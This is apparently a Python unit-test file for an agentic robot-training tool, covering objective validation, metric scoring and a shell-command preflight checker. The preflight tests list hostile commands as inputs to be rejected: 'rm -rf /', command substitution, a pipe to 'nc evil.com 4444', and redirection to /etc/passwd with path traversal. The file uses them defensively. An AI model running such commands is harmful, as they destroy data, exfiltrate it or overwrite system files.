import unittest

from agentic_robot import objective as objmod
from agentic_robot import scoring


def _valid_objective():
    return {
        "run_dir": "outputs/train_loop/pusht_act_001",
        "metric_path": "overall.pc_success",
        "comparison": ">=",
        "target": 80.0,
        "eval_command": "uv run lerobot-eval --policy.path={checkpoint} --output_dir={eval_dir}",
        "stagnation_rounds": 2,
    }


class ObjectiveValidationTests(unittest.TestCase):
    def test_valid_objective_has_no_errors(self):
        self.assertEqual(objmod.validate_objective(_valid_objective()), [])

    def test_missing_required_field_reported(self):
        obj = _valid_objective()
        del obj["target"]
        errors = objmod.validate_objective(obj)
        self.assertTrue(any("target" in e for e in errors))

    def test_bad_comparison_rejected(self):
        obj = _valid_objective()
        obj["comparison"] = "=="
        self.assertTrue(objmod.validate_objective(obj))

    def test_unknown_field_is_tolerated(self):
        obj = _valid_objective()
        obj["operator_note"] = "anything"
        self.assertEqual(objmod.validate_objective(obj), [])

    def test_acceptance_metric_vector_validates(self):
        obj = _valid_objective()
        obj["acceptance"] = {
            "success_rate": {"comparison": ">=", "target": 0.80},
            "unsafe_success_rate": {"comparison": "<=", "target": 0.00},
        }
        self.assertEqual(objmod.validate_objective(obj), [])

    def test_acceptance_metric_missing_target_rejected(self):
        obj = _valid_objective()
        obj["acceptance"] = {"success_rate": {"comparison": ">="}}
        self.assertTrue(objmod.validate_objective(obj))


class CommandPreflightTests(unittest.TestCase):
    def test_clean_command_passes(self):
        cmd = "uv run lerobot-eval --policy.path={checkpoint} --output_dir={eval_dir}"
        self.assertEqual(objmod.command_preflight(cmd, run_dir="out", allowed_executables=[]), [])

    def test_unknown_placeholder_flagged(self):
        cmd = "uv run x --path={secret}"
        v = objmod.command_preflight(cmd, run_dir="out", allowed_executables=[])
        self.assertTrue(any("placeholder" in x for x in v))

    def test_shell_metacharacters_flagged(self):
        bad_cmds = [
            "uv run x; rm -rf /",
            "uv run $(evil)",
            "uv run x `id`",
            "uv run x &",
            "uv run x | nc evil.com 4444",
            "uv run x || nc evil.com 4444",
        ]
        for bad in bad_cmds:
            with self.subTest(bad=bad):
                self.assertTrue(objmod.command_preflight(bad, run_dir="out", allowed_executables=[]))

    def test_disallowed_executable_flagged(self):
        v = objmod.command_preflight("bash evil.sh", run_dir="out", allowed_executables=[])
        self.assertTrue(any("must start with" in x for x in v))
        self.assertEqual(objmod.command_preflight("bash ok.sh", run_dir="out", allowed_executables=["bash"]), [])

    def test_redirection_outside_run_dir_flagged(self):
        def pf(cmd):
            return objmod.command_preflight(cmd, run_dir="out", allowed_executables=[])

        self.assertTrue(any("redirection" in x for x in pf("uv run x > /etc/passwd")))
        # traversal out of the eval dir must not slip through a bare startswith
        self.assertTrue(any("redirection" in x for x in pf("uv run x > {eval_dir}/../../etc/passwd")))
        # sibling-prefix directory ("out_secret" vs run_dir "out") must be rejected
        self.assertTrue(any("redirection" in x for x in pf("uv run x > out_secret/evil")))
        # a genuine target inside the eval dir passes
        self.assertEqual(pf("uv run x > {eval_dir}/log"), [])
        self.assertEqual(pf("uv run x > out/log"), [])


class ScoringTests(unittest.TestCase):
    def test_parse_nested_metric(self):
        self.assertEqual(scoring.parse_metric({"overall": {"pc_success": 83.5}}, "overall.pc_success"), 83.5)

    def test_parse_missing_metric_raises(self):
        with self.assertRaises(KeyError):
            scoring.parse_metric({"overall": {}}, "overall.pc_success")

    def test_parse_non_numeric_raises(self):
        with self.assertRaises(ValueError):
            scoring.parse_metric({"overall": {"pc_success": "high"}}, "overall.pc_success")

    def test_bool_is_not_numeric(self):
        with self.assertRaises(ValueError):
            scoring.parse_metric({"x": True}, "x")

    def test_compare_operators(self):
        self.assertTrue(scoring.compare(80.0, ">=", 80.0))
        self.assertFalse(scoring.compare(79.9, ">=", 80.0))
        self.assertTrue(scoring.compare(0.0, "<=", 0.0))

    def test_acceptance_report_pass_and_fail(self):
        eval_info = {"success_rate": 0.9, "unsafe_success_rate": 0.0}
        acceptance = {
            "success_rate": {"comparison": ">=", "target": 0.80},
            "unsafe_success_rate": {"comparison": "<=", "target": 0.00},
        }
        results = scoring.acceptance_report(eval_info, acceptance)
        self.assertTrue(scoring.acceptance_passed(results))

        failing = scoring.acceptance_report({"success_rate": 0.5}, acceptance)
        self.assertFalse(scoring.acceptance_passed(failing))

    def test_missing_metric_never_passes_gate(self):
        results = scoring.acceptance_report({}, {"success_rate": {"comparison": ">=", "target": 0.8}})
        self.assertFalse(scoring.acceptance_passed(results))
        self.assertIsNone(results[0].value)


if __name__ == "__main__":
    unittest.main()
